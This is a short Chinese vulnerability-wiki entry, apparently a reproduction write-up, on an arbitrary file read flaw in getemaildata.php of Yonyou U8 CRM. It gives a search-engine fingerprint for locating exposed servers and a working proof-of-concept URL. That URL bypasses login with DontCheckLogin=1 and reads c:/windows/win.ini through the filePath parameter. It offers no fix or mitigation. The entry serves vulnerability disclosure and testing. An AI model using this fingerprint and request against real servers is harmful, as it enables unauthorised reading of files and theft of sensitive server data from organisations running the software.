---
title: "用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞"
date: 2026-10-17 09:13:01
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "用友"
tags:
  - "用友"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

用友 U8 CRM客户关系管理系统 getemaildata.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取到服务器中的敏感文件

## 漏洞影响

用友 U8 CRM客户关系管理系统

## 网络测绘

```
web.body="用友U8CRM"
```

## 漏洞复现

登陆页面

![image-20230828150939621](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20230828150939621.png)

验证POC

```
/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini
```

![image-20230828150951560](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20230828150951560.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E7%94%A8%E5%8F%8B-U8-CRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
